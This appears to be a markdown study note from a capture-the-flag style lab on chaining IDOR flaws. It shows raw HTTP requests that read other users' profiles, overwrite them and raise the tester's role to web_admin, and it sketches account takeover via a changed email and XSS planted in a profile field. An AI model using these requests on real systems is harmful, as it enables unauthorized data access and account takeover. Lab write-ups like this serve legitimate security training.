---
title: f-Chaining IDORs
draft: false
tags:
  - idor
---
Let's send a `GET` request with another `uid`:

```
GET /profile/api.php/profile/5 HTTP/1.1
Host: 83.136.254.113:42013
Content-Length: 208
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Content-type: application/json
Accept: */*
Origin: http://83.136.254.113:42013
Referer: http://83.136.254.113:42013/profile/index.php
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: role=employee
Connection: keep-alive
```

As we can see, this returned the details of another user, with their own `uuid` and `role`, confirming an `IDOR Information Disclosure vulnerability`:

```json
{
    "uid": "2",
    "uuid": "4a9bd19b3b8676199592a346051f950c",
    "role": "employee",
    "full_name": "Iona Franklyn",
    "email": "i_franklyn@employees.htb",
    "about": "It takes 20 years to build a reputation and few minutes of cyber-incident to ruin it."
}
```

Using above's IDOR, we can obtain `uuid` for different `uid`s.

## Modifying Other Users' Details

Now, with the user's `uuid` at hand, we can change this user's details by sending a `PUT` request to `/profile/api.php/profile/2` with the above details along with any modifications we made, as follows:

```
PUT /profile/api.php/profile/2 HTTP/1.1
Host: 83.136.254.113:42013
Content-Length: 208
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Content-type: application/json
Accept: */*
Origin: http://83.136.254.113:42013
Referer: http://83.136.254.113:42013/profile/index.php
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: role=employee
Connection: keep-alive

{"uid":2,"uuid":"4a9bd19b3b8676199592a346051f950c","role":"employee","full_name":"hacked","email":"a_lindon@employees.htb","about":"hacked"}
```

In addition to allowing us to view potentially sensitive details, the ability to modify another user's details also enables us to perform several other attacks. One type of attack is `modifying a user's email address` and then requesting a password reset link, which will be sent to the email address we specified, thus allowing us to take control over their account. Another potential attack is `placing an XSS payload in the 'about' field`, which would get executed once the user visits their `Edit profile` page, enabling us to attack the user in different ways.

## Chaining Two IDORs

Using a custom script that enumerate all users, we found admin user with the following detail:

```json
{
    "uid": "X",
    "uuid": "a36fa9e66e85f2dd6f5e13cad45248ae",
    "role": "web_admin",
    "full_name": "administrator",
    "email": "webadmin@employees.htb",
    "about": "HTB{FLAG}"
}
```

Now that we know the name for the admin role, we can give our self admin access:

```json
{
    "uid": "1",
    "uuid": "40f5888b67c748df7efba008e7c2f9d2",
    "role": "web_admin",
    "full_name": "Amy Lindon",
    "email": "a_lindon@employees.htb",
    "about": "A Release is like a boat. 80% of the holes plugged is not good enough."
}
```

